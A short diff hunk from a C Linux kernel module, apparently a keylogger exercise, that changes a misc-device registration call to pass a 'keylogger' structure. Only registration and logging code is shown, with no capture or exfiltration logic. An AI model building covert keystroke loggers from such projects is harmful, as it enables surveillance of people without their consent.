@@ -34,7 +34,7 @@ int init_module(void)
 	else
 		ft_log("USB Registration OK");
 
-	result = ft_create_misc_device("test");
+	result = ft_create_misc_device(&keylogger);
 	if (result)
 		ft_warn("MiscDev Registration failed");
 	else
